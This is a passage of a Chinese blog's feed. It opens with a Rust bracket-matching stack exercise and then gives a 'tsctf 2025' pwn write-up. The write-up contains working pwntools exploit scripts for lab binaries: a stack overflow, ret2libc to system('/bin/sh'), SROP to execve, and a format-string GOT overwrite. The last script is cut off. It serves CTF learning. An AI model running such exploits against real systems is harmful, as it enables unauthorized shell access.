class="token function">trans</span><span class="token punctuation">(</span><span class="token number">1348</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>看到结果：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">running <span class="token number">1</span> <span class="token builtin class-name">test</span><span class="token number">2504</span><span class="token builtin class-name">test</span> stack::tests::test_trans <span class="token punctuation">..</span>. ok<span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">0</span>.00s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>完成</p><h2 id="括号匹配的检验"><a href="#括号匹配的检验" class="headerlink" title="括号匹配的检验"></a>括号匹配的检验</h2><h3 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h3><p>假设表达式中允许有两种括号：圆括号和方括号，其嵌套的顺序随意，即（（）[ ]）或[（[ ] [ ]）]等为正确格式，[（]）或（（（]均为不正确的格式。检验括号是否匹配的方法可用”期待的紧迫程度”这个概念来描述。</p><p>例如：考虑下列的括号序列：<br><pre class="line-numbers language-none"><code class="language-none">[  (  [  ]  [  ]  )  ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>当计算机接收了第1个括号以后，它期待着与其匹配的第8个括号的出现，然而等来的却是第2个括号，此时第1个括号”[“只能暂时靠边，而迫切等待与第2个括号相匹配的第7个括号”）”的出现，类似的，因只等来了第3个括号”[“，此时，其期待的紧迫程度较第2个括号更紧迫，则第2个括号只能靠边，让位于第3个括号，显然第3个括号的期待紧迫程度高于第2个括号，而第2个括号的期待紧迫程度高于第1个括号；在接收了第4个括号之后，第3个括号的期待得到了满足，消解之后，第2个括号的期待匹配就成了最急迫的任务了，……，依次类推。可见这个处理过程正好和栈的特点相吻合。</p><h3 id="基本要求-1"><a href="#基本要求-1" class="headerlink" title="基本要求"></a>基本要求</h3><p>读入圆括号和方括号的任意序列，输出”匹配”或”此串括号匹配不合法”。</p><h3 id="测试数据-1"><a href="#测试数据-1" class="headerlink" title="测试数据"></a>测试数据</h3><ul><li>输入 <code>([ ]())</code>，结果”匹配”</li><li>输入 <code>[( ))</code>，结果”此串括号匹配不合法”</li></ul><h3 id="实现提示"><a href="#实现提示" class="headerlink" title="实现提示"></a>实现提示</h3><p>设置一个栈，每读入一个括号：</p><ul><li>若是左括号，则作为一个新的更急迫的期待压入栈中</li><li>若是右括号，并且与当前栈顶的左括号相匹配，则将当前栈顶的左括号退出</li><li>继续读下一个括号</li><li>如果读入的右括号与当前栈顶的左括号不匹配，则属于不合法的情况</li></ul><p>在初始和结束时，栈应该是空的。</p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>增加了一个辅助函数<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">is_empty</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>top <span class="token operator">==</span> <span class="token number">0</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">_match</span><span class="token punctuation">(</span>seq <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> seq<span class="token punctuation">.</span><span class="token function">chars</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">match</span> c <span class="token punctuation">&#123;</span>            <span class="token char">'('</span> <span class="token operator">|</span> <span class="token char">'['</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>c <span class="token keyword">as</span> <span class="token keyword">i32</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">,</span>            <span class="token char">')'</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token operator">!=</span> <span class="token char">'('</span> <span class="token keyword">as</span> <span class="token keyword">i32</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"括号不匹配"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token char">']'</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token operator">!=</span> <span class="token char">'['</span> <span class="token keyword">as</span> <span class="token keyword">i32</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"括号不匹配"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            _ <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"出现非预期字符"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token comment">// 忽略其他字符</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"mismatch"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_match</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"()"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"[]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"([])"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"[()]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"([][])"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"(([]))"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 不匹配的情况</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"([)]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"]["</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"())"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"[[]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="停车场管理"><a href="#停车场管理" class="headerlink" title="停车场管理"></a>停车场管理</h2><p>逃了逃了</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;基本结构&quot;&gt;&lt;a href=&quot;#基本结构&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
    <category term="栈" scheme="https://aucept.in/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>tsctf 2025</title>
    <link href="https://aucept.in/2025/10/12/tsctf-2025/"/>
    <id>https://aucept.in/2025/10/12/tsctf-2025/</id>
    <published>2025-10-12T15:28:17.000Z</published>
    <updated>2025-10-12T17:02:42.302Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h2><p>签到题，明摆着的栈溢出和后门函数，略</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>ret_addr <span class="token operator">=</span> <span class="token number">0x400501</span>backdoor <span class="token operator">=</span> <span class="token number">0x0400676</span>io <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"host.docker.internal"</span><span class="token punctuation">,</span> <span class="token number">64958</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"sign-in!"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>提示了ret2libc<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _BYTE v1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No backdoors this time!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>只给了一个任意读，第一步是泄露libc基地址，利用got表泄露，gadget都很全，然后回到vuln函数再利用一次</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400713</span>ret_addr <span class="token operator">=</span> <span class="token number">0x4004c9</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span><span class="token comment">#io = process('./pwn')</span>io <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"host.docker.internal"</span><span class="token punctuation">,</span><span class="token number">32821</span><span class="token punctuation">)</span><span class="token comment"># 第一阶段：泄露puts地址</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> vuln_addr <span class="token operator">=</span> <span class="token number">0x400626</span>payload1 <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">24</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"time!"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token comment"># 接收泄露的地址</span>puts_leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"puts leak: 0x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>puts_leak<span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc base: 0x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>libc_base<span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"system: 0x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>system_addr<span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/bin/sh: 0x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>binsh_addr<span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># 第二阶段：获取shell</span>payload2 <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">24</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment">#gdb.attach(io)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Easy-syscall"><a href="#Easy-syscall" class="headerlink" title="Easy-syscall"></a>Easy-syscall</h2><p>有一个magic函数<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  result <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>  __asm <span class="token punctuation">&#123;</span> syscall<span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_rt_sigreturn <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>进行了一个陌生的系统调用，其作用很强大，根据栈上数据重新设置所有寄存器的值，pwntools里有<code>SigreturnFrame()</code>函数来辅助构建payload</p><p>既然可以随意修改寄存器的值了，还有栈溢出可以ROP，那就把rax设置成59，再跳到call system即可<br><pre class="line-numbers language-none"><code class="language-none">from pwn import *context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]#io &#x3D; process(&#39;.&#x2F;pwn&#39;)io &#x3D; connect(&quot;host.docker.internal&quot;,36493)io.recvuntil(b&quot;here...&quot;)magic_addr &#x3D; 0x40117Ebinsh &#x3D; 0x0402008ret_addr &#x3D; 0x40101asyscall_addr &#x3D; 0x401185bss_addr &#x3D; 0x404060frame &#x3D; SigreturnFrame() frame.rax &#x3D; 59frame.rdi &#x3D; 0x402008frame.rsi &#x3D; 0frame.rdx &#x3D; 0frame.rip &#x3D; 0x401185frame_bytes &#x3D; bytes(frame)payload &#x3D; b&quot;A&quot;*48 + b&quot;B&quot;*8payload +&#x3D; p64(magic_addr)payload +&#x3D; bytes(frame)#gdb.attach(io)io.send(payload)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>解这道题的时候一开始手欠在ROP链的开始放了一个ret的gadget，导致sigreturn的时候寄存器全都错位了且其中一个怎么都设置不对正确的值，一度以为pwntools不靠谱了</p><h2 id="sentences"><a href="#sentences" class="headerlink" title="sentences"></a>sentences</h2><p>一如既往地打开IDA</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-114h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-110h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+118h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do you have anything you'd like to say to the problem setter?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You can only say three sentences."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alright, I haven't received anything now."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"And I won't give you a reply in the future either."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v3 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显的格式化字符串漏洞，思路也很明确，先泄露栈地址、libc上函数地址，再利用栈地址找偏移，篡改循环变量i的值为负数，再篡改printf的got表项使其指向system，最后传一个<code>/bin/sh\x00</code>给printf</p><p>system和printf的libc地址后三字节不同，选择在一次printf里分两次篡改，幸好read的长度足够，没有卡这点，可以放心的拆分。循环里两次read之间没有输出提示，需要sleep一下调控</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>system_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>target_addr <span class="token operator">=</span> <span class="token number">0x401274</span><span class="token comment">#io = process('./pwn')</span>io <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"host.docker.internal"</span><span class="token punctuation">,</span> <span class="token number">52701</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'sentences.'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'%p%p%p%43$p'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token 